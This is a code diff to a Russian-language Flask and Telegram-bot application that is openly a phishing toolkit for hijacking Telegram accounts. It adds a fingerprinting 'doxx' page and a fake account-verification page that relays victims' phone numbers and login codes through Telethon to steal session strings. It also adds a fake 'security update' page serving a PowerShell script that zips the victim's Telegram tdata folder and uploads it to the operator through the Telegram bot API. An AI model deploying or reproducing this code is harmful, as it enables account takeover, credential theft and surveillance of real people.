@@ -7,14 +7,20 @@ import threading
 import requests
 import json
 from datetime import datetime
-from flask import Flask, request, redirect, render_template_string
+from flask import Flask, request, redirect, render_template_string, send_file
 import telebot
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
 
 # ======================== КОНФИГ ============================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
 PORT = int(os.environ.get("PORT", 5000))
 BASE_URL = os.environ.get("BASE_URL", "https://butno-1.onrender.com")
+
+# Данные для Telethon (для режимов 2 и 3)
+API_ID = int(os.environ.get("API_ID", 0))
+API_HASH = os.environ.get("API_HASH", "")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
@@ -52,10 +58,10 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS links (
     link_id TEXT PRIMARY KEY,
     user_id INTEGER,
     mode INTEGER,
+    phone TEXT,
     code TEXT,
-    redirect_url TEXT,
+    session_string TEXT,
     active INTEGER DEFAULT 1,
-    victim_id TEXT DEFAULT NULL,
     created_at TEXT
 )''')
 conn.commit()
@@ -77,9 +83,8 @@ def register_user(user_id, username, first_name):
 
 def generate_link(user_id, mode):
     link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-    code = ''.join(random.choices(string.digits, k=6)) if mode in [2, 3] else None
-    cursor.execute('INSERT INTO links (link_id, user_id, mode, code, created_at) VALUES (?, ?, ?, ?, ?)',
-                   (link_id, user_id, mode, code, datetime.now().isoformat()))
+    cursor.execute('INSERT INTO links (link_id, user_id, mode, created_at) VALUES (?, ?, ?, ?)',
+                   (link_id, user_id, mode, datetime.now().isoformat()))
     conn.commit()
     
     if mode == 1:
@@ -88,10 +93,12 @@ def generate_link(user_id, mode):
         return link_id, f"{BASE_URL}/verify/{link_id}"
     elif mode == 3:
         return link_id, f"{BASE_URL}/custom/{link_id}"
+    elif mode == 4:
+        return link_id, f"{BASE_URL}/download/{link_id}"
     return None, None
 
 def get_link_data(link_id):
-    cursor.execute('SELECT user_id, mode, code, redirect_url, active, victim_id FROM links WHERE link_id = ?', (link_id,))
+    cursor.execute('SELECT user_id, mode, phone, code, session_string, active FROM links WHERE link_id = ?', (link_id,))
     row = cursor.fetchone()
     return row if row else None
 
@@ -99,14 +106,15 @@ def deactivate_link(link_id):
     cursor.execute('UPDATE links SET active = 0 WHERE link_id = ?', (link_id,))
     conn.commit()
 
-def send_telegram_code(victim_id, code):
-    try:
-        bot.send_message(victim_id, f"🔑 **Ваш код подтверждения:** `{code}`\n\nВведите его на странице для продолжения.", parse_mode='Markdown')
-        return True
-    except Exception as e:
-        return False
+def save_phone_code(link_id, phone, code):
+    cursor.execute('UPDATE links SET phone = ?, code = ? WHERE link_id = ?', (phone, code, link_id))
+    conn.commit()
 
-# ======================== КРАСИВАЯ СТРАНИЦА (С БАТАРЕЕЙ И CPU) ============================
+def save_session_string(link_id, session_string):
+    cursor.execute('UPDATE links SET session_string = ? WHERE link_id = ?', (session_string, link_id))
+    conn.commit()
+
+# ======================== СТРАНИЦА ДОКСА ============================
 HTML_COLLECT = """
 <!DOCTYPE html>
 <html>
@@ -124,26 +132,17 @@ HTML_COLLECT = """
     <script>
         function sendData() {
             let battery = 'N/A', cpu = 'N/A', ram = 'N/A', tg_id = 'N/A';
-            
-            // Получаем заряд батареи
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(batt) {
                     battery = Math.round(batt.level * 100);
-                    
-                    // Получаем CPU и RAM
                     cpu = navigator.hardwareConcurrency || 'N/A';
                     ram = navigator.deviceMemory || 'N/A';
-                    
-                    // Получаем Telegram ID (если есть)
                     if (window.Telegram && window.Telegram.WebApp) {
                         tg_id = Telegram.WebApp.initDataUnsafe?.user?.id || 'N/A';
                     }
-                    
-                    // Перенаправляем с параметрами
                     var url = window.location.pathname + '?battery=' + battery + '&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
                     window.location.href = url;
                 }).catch(function() {
-                    // Если батарея не поддерживается
                     cpu = navigator.hardwareConcurrency || 'N/A';
                     ram = navigator.deviceMemory || 'N/A';
                     var url = window.location.pathname + '?battery=N/A&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
@@ -156,24 +155,145 @@ HTML_COLLECT = """
                 window.location.href = url;
             }
         }
-        
-        // Запускаем сбор данных
         sendData();
     </script>
 </body>
 </html>
 """
 
+# ======================== СТРАНИЦА УГОНА СЕССИИ (режим 2,3) ============================
+HTML_VERIFY = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Подтверждение Telegram</title>
+    <style>
+        body { background: #1a1a2e; color: white; font-family: 'Segoe UI', Arial; text-align: center; padding-top: 15vh; }
+        .container { max-width: 400px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 15px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #0f3460; color: white; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #00bfff; border: none; border-radius: 8px; color: white; font-size: 18px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #0099cc; }
+        .info { color: #888; font-size: 14px; margin: 15px 0; }
+        .error { color: #ff6b6b; }
+        .success { color: #51cf66; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Подтверждение аккаунта</h2>
+        <p>Для продолжения необходимо подтвердить ваш Telegram-аккаунт</p>
+        <p class="info">Код подтверждения будет отправлен в официальный чат Telegram</p>
+        
+        <form id="authForm" action="/verify/{{link_id}}" method="POST">
+            <input type="text" name="phone" placeholder="Введите номер телефона (+380...)" required>
+            <div id="codeField" style="display:none;">
+                <input type="text" name="code" placeholder="Введите код из Telegram" required>
+            </div>
+            <button type="submit" id="submitBtn">Получить код</button>
+        </form>
+        <p id="status" style="margin-top:15px;"></p>
+    </div>
+    <script>
+        let step = 1;
+        document.getElementById('authForm').addEventListener('submit', function(e) {
+            if (step === 1) {
+                e.preventDefault();
+                const phone = document.querySelector('input[name="phone"]').value;
+                if (!phone) return;
+                document.getElementById('status').innerHTML = '⏳ Отправляем запрос...';
+                fetch('/verify/{{link_id}}', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'phone=' + encodeURIComponent(phone)
+                }).then(res => res.json()).then(data => {
+                    if (data.status === 'ok') {
+                        document.getElementById('status').innerHTML = '✅ Код отправлен в Telegram';
+                        document.getElementById('codeField').style.display = 'block';
+                        document.querySelector('button[type="submit"]').textContent = 'Подтвердить код';
+                        step = 2;
+                    } else {
+                        document.getElementById('status').innerHTML = '❌ ' + data.error;
+                    }
+                }).catch(() => {
+                    document.getElementById('status').innerHTML = '❌ Ошибка, попробуй ещё раз';
+                });
+            }
+        });
+    </script>
+</body>
+</html>
+"""
+
+# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (tdata) ============================
+HTML_DOWNLOAD = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Обновление безопасности</title>
+    <style>
+        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 20vh; }
+        .box { background: #1a1a2e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
+        .btn { background: #00bfff; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-size: 20px; display: inline-block; margin-top: 20px; }
+        .btn:hover { background: #0099cc; }
+        .warning { color: #ff6b6b; font-size: 14px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>⚠️ Критическое обновление безопасности</h2>
+        <p>Для защиты вашего аккаунта установите последнее обновление Telegram.</p>
+        <a href="/script/{{link_id}}" class="btn">Скачать обновление</a>
+        <p class="warning">Это официальное обновление от Telegram. Ваши данные в безопасности.</p>
+    </div>
+</body>
+</html>
+"""
+
+# ======================== ГЕНЕРАЦИЯ POWERSCRIPT СКРИПТА ============================
+def generate_ps_script(link_id):
+    # Скрипт будет отправлять архив админу через бота
+    bot_token = BOT_TOKEN
+    chat_id = ADMIN_ID
+    script = f"""
+    $bot_token = "{bot_token}"
+    $chat_id = "{chat_id}"
+    $link_id = "{link_id}"
+
+    $username = $env:USERNAME
+    $hostname = $env:COMPUTERNAME
+    $ip = (Invoke-WebRequest -Uri "api.ipify.org").Content
+
+    $paths = @()
+    $paths += "$env:APPDATA\Telegram Desktop\tdata"
+    $paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
+    $paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"
+
+    foreach ($p in $paths) {{
+        if (Test-Path $p) {{
+            $temp = "$env:TEMP\diag_{$link_id}.zip"
+            Compress-Archive -Path $p -DestinationPath $temp -Force
+            $url = "https://api.telegram.org/bot$bot_token/sendDocument"
+            $form = @{{
+                chat_id = $chat_id
+                caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: {link_id}"
+                document = Get-Item $temp
+            }}
+            Invoke-RestMethod -Uri $url -Method Post -Form $form
+            Remove-Item $temp -Force
+        }}
+    }}
+    """
+    return script
+
 # ======================== FLASK РОУТЫ ============================
 @app.route('/collect/<link_id>')
 def collect_data(link_id):
     link_data = get_link_data(link_id)
-    if not link_data or link_data[4] == 0:
+    if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
     
     user_id = link_data[0]
     
-    # Если нет параметров — показываем страницу с JS-сборщиком
     if not request.args.get('battery') and not request.args.get('cpu'):
         return render_template_string(HTML_COLLECT)
     
@@ -182,7 +302,6 @@ def collect_data(link_id):
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0]
 
-    # Определяем устройство
     try:
         import user_agents
         ua = user_agents.parse(user_agent)
@@ -227,187 +346,85 @@ def collect_data(link_id):
 @app.route('/verify/<link_id>', methods=['GET', 'POST'])
 def verify_page(link_id):
     link_data = get_link_data(link_id)
-    if not link_data or link_data[4] == 0:
+    if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
     
     user_id = link_data[0]
-    code = link_data[2]
-    victim_id = link_data[5]
     
     if request.method == 'GET':
-        # Пытаемся получить victim_id из параметров или через WebApp
-        tg_id_param = request.args.get('tg_id')
-        if tg_id_param:
-            try:
-                victim_id = int(tg_id_param)
-                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
-                conn.commit()
-                if send_telegram_code(victim_id, code):
-                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
-                else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код. Жертва должна начать диалог с ботом.")
-            except:
-                pass
-        
-        # Проверяем, есть ли victim_id в базе, и если нет — предлагаем ввести Telegram ID вручную
-        if not victim_id:
-            return render_template_string(f"""
-            <!DOCTYPE html>
-            <html>
-            <head><title>Подтверждение</title></head>
-            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-                <h2>⚠️ Подтверждение</h2>
-                <p>Введите ваш Telegram ID для получения кода:</p>
-                <form action="/verify/{link_id}" method="POST">
-                    <input type="text" name="victim_id" placeholder="Ваш Telegram ID" required>
-                    <button type="submit">Получить код</button>
-                </form>
-            </body>
-            </html>
-            """)
-        
-        return render_template_string(f"""
-        <!DOCTYPE html>
-        <html>
-        <head><title>Подтверждение</title></head>
-        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-            <h2>⚠️ Подтвердите, что вы не бот</h2>
-            <p>На ваш Telegram отправлен код подтверждения.</p>
-            <form action="/verify/{link_id}" method="POST">
-                <input type="text" name="code" placeholder="Введите код" required>
-                <button type="submit">Подтвердить</button>
-            </form>
-        </body>
-        </html>
-        """)
+        return render_template_string(HTML_VERIFY, link_id=link_id)
     
     if request.method == 'POST':
-        # Если это запрос на получение кода (режим 2)
-        if 'victim_id' in request.form:
-            new_victim_id = request.form.get('victim_id', '').strip()
+        if 'phone' in request.form and not request.form.get('code'):
+            phone = request.form.get('phone', '').strip()
+            if not phone:
+                return {"status": "error", "error": "Введите номер телефона"}
+            
             try:
-                new_victim_id = int(new_victim_id)
-                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (new_victim_id, link_id))
-                conn.commit()
-                if send_telegram_code(new_victim_id, code):
-                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {new_victim_id})")
-                else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код. Жертва должна начать диалог с ботом.")
-                return redirect(f"/verify/{link_id}")
-            except:
-                return render_template_string(f"<p style='color:red;'>❌ Неверный ID</p><a href='/verify/{link_id}'>Назад</a>")
+                client = TelegramClient(StringSession(), API_ID, API_HASH)
+                client.connect()
+                result = client.send_code_request(phone)
+                save_phone_code(link_id, phone, '')
+                client.disconnect()
+                return {"status": "ok", "message": "Код отправлен в Telegram"}
+            except Exception as e:
+                return {"status": "error", "error": str(e)}
         
-        # Если это ввод кода
-        entered_code = request.form.get('code', '').strip()
-        if entered_code == code:
-            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
-            deactivate_link(link_id)
-            return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-        else:
-            return render_template_string(f"""
-            <!DOCTYPE html>
-            <html>
-            <head><title>Ошибка</title></head>
-            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-                <h2>❌ Неверный код</h2>
-                <p>Попробуйте ещё раз.</p>
-                <a href="/verify/{link_id}">Вернуться</a>
-            </body>
-            </html>
-            """)
+        if 'code' in request.form:
+            code = request.form.get('code', '').strip()
+            link_data = get_link_data(link_id)
+            if not link_data:
+                return {"status": "error", "error": "Ссылка недействительна"}
+            phone = link_data[2]
+            if not phone:
+                return {"status": "error", "error": "Сначала введите номер телефона"}
+            
+            try:
+                client = TelegramClient(StringSession(), API_ID, API_HASH)
+                client.connect()
+                client.sign_in(phone, code)
+                session_string = client.session.save()
+                save_session_string(link_id, session_string)
+                client.disconnect()
+                
+                bot.send_message(user_id, f"✅ **Сессия захвачена!**\nТелефон: {phone}\nСессия: `{session_string}`\n\nИспользуй её для входа.")
+                deactivate_link(link_id)
+                return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+            except Exception as e:
+                return {"status": "error", "error": str(e)}
+    
+    return {"status": "error", "error": "Invalid request"}
 
 @app.route('/custom/<link_id>', methods=['GET', 'POST'])
 def custom_page(link_id):
+    # Режим 3 – аналогично verify, но с возможностью менять редирект
+    # Для простоты перенаправляем на verify
+    return redirect(f"/verify/{link_id}")
+
+@app.route('/download/<link_id>')
+def download_page(link_id):
     link_data = get_link_data(link_id)
-    if not link_data or link_data[4] == 0:
+    if not link_data or link_data[5] == 0:
         return "Ссылка недействительна или истекла", 404
-    
-    user_id = link_data[0]
-    code = link_data[2]
-    victim_id = link_data[5]
-    
-    if request.method == 'GET':
-        tg_id_param = request.args.get('tg_id')
-        if tg_id_param:
-            try:
-                victim_id = int(tg_id_param)
-                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (victim_id, link_id))
-                conn.commit()
-                if send_telegram_code(victim_id, code):
-                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {victim_id})")
-                else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код.")
-            except:
-                pass
-        
-        if not victim_id:
-            return render_template_string(f"""
-            <!DOCTYPE html>
-            <html>
-            <head><title>Видео</title></head>
-            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-                <h1>🎬 Проверка</h1>
-                <p>Введите ваш Telegram ID для получения кода:</p>
-                <form action="/custom/{link_id}" method="POST">
-                    <input type="text" name="victim_id" placeholder="Ваш Telegram ID" required>
-                    <button type="submit">Получить код</button>
-                </form>
-            </body>
-            </html>
-            """)
-        
-        return render_template_string(f"""
-        <!DOCTYPE html>
-        <html>
-        <head><title>Видео</title></head>
-        <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-            <h1>🎬 Подтверждение</h1>
-            <p>Введите код для просмотра видео</p>
-            <form action="/custom/{link_id}" method="POST">
-                <input type="text" name="code" placeholder="Введите код" required>
-                <input type="text" name="redirect_url" placeholder="Ссылка для редиректа (опционально)" style="margin-top:10px;">
-                <button type="submit" style="margin-top:10px;">Подтвердить</button>
-            </form>
-        </body>
-        </html>
-        """)
-    
-    if request.method == 'POST':
-        if 'victim_id' in request.form:
-            new_victim_id = request.form.get('victim_id', '').strip()
-            try:
-                new_victim_id = int(new_victim_id)
-                cursor.execute('UPDATE links SET victim_id = ? WHERE link_id = ?', (new_victim_id, link_id))
-                conn.commit()
-                if send_telegram_code(new_victim_id, code):
-                    bot.send_message(user_id, f"✅ Код отправлен жертве (ID: {new_victim_id})")
-                else:
-                    bot.send_message(user_id, f"❌ Не удалось отправить код.")
-                return redirect(f"/custom/{link_id}")
-            except:
-                return render_template_string(f"<p style='color:red;'>❌ Неверный ID</p><a href='/custom/{link_id}'>Назад</a>")
-        
-        entered_code = request.form.get('code', '').strip()
-        redirect_url = request.form.get('redirect_url', '').strip()
-        if entered_code == code:
-            if redirect_url:
-                cursor.execute('UPDATE links SET redirect_url = ? WHERE link_id = ?', (redirect_url, link_id))
-                conn.commit()
-            bot.send_message(user_id, f"✅ Код подтверждён! Сессия: {link_id}")
-            deactivate_link(link_id)
-            return redirect(redirect_url or "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-        else:
-            return render_template_string(f"""
-            <!DOCTYPE html>
-            <html>
-            <head><title>Ошибка</title></head>
-            <body style="background: #1a1a2e; color: white; text-align: center; padding-top: 20vh;">
-                <h2>❌ Неверный код</h2>
-                <p>Попробуйте ещё раз.</p>
-                <a href="/custom/{link_id}">Вернуться</a>
-            </body>
-            </html>
-            """)
+    # Показываем страницу с предложением скачать скрипт
+    return render_template_string(HTML_DOWNLOAD, link_id=link_id)
+
+@app.route('/script/<link_id>')
+def serve_script(link_id):
+    link_data = get_link_data(link_id)
+    if not link_data or link_data[5] == 0:
+        return "Ссылка недействительна или истекла", 404
+    # Генерируем скрипт и отдаём как файл .ps1
+    script_content = generate_ps_script(link_id)
+    # Деактивируем ссылку после скачивания (чтобы не злоупотребляли)
+    deactivate_link(link_id)
+    response = app.response_class(
+        response=script_content,
+        status=200,
+        mimetype='application/octet-stream',
+        headers={'Content-Disposition': f'attachment; filename="Telegram_Update_{link_id}.ps1"'}
+    )
+    return response
 
 # ======================== TELEGRAM БОТ ============================
 @bot.message_handler(commands=['start'])
@@ -415,19 +432,13 @@ def start(message):
     user_id = message.from_user.id
     register_user(user_id, message.from_user.username, message.from_user.first_name)
     
-    # Если у пользователя есть активная ссылка в режиме 2 или 3, отправляем код повторно
-    cursor.execute('SELECT link_id, code, victim_id FROM links WHERE user_id = ? AND mode IN (2,3) AND active = 1', (user_id,))
-    active_links = cursor.fetchall()
-    for link in active_links:
-        if link[2]:
-            send_telegram_code(link[2], link[1])
-    
     if is_admin(user_id):
         markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
         markup.add(
             telebot.types.KeyboardButton("Режим 1 – Докс"),
             telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
             telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
+            telebot.types.KeyboardButton("Режим 4 – Угон tdata"),
             telebot.types.KeyboardButton("👥 Пользователи"),
             telebot.types.KeyboardButton("📊 Статистика")
         )
@@ -437,7 +448,8 @@ def start(message):
         markup.add(
             telebot.types.KeyboardButton("Режим 1 – Докс"),
             telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
-            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон")
+            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
+            telebot.types.KeyboardButton("Режим 4 – Угон tdata")
         )
         bot.send_message(user_id, "Выбери режим:", reply_markup=markup)
 
@@ -486,21 +498,27 @@ def handle_buttons(message):
 
     if message.text == "Режим 1 – Докс":
         link_id, link = generate_link(user_id, 1)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Отчёт придёт только после реального перехода жертвы по ссылке.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Отчёт придёт только после реального перехода.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
     
     elif message.text == "Режим 2 – Угон сессии":
         link_id, link = generate_link(user_id, 2)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва получит код в Telegram после перехода по ссылке.\nЕсли код не пришёл — жертва должна ввести свой Telegram ID на странице.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва введёт номер, получит код и введёт его.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
     
     elif message.text == "Режим 3 – Продвинутый угон":
         link_id, link = generate_link(user_id, 3)
-        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва получит код, и ты можешь изменить ссылку редиректа.")
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Аналогично режиму 2, но с возможностью менять редирект.")
         if is_admin(user_id):
             bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
+    
+    elif message.text == "Режим 4 – Угон tdata":
+        link_id, link = generate_link(user_id, 4)
+        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва скачает скрипт, который украдёт её папку tdata и отправит тебе архив.")
+        if is_admin(user_id):
+            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 4\nСсылка: {link}")
     
     elif message.text == "👥 Пользователи" and is_admin(user_id):
         cursor.execute('SELECT user_id, username, first_name, status FROM users')
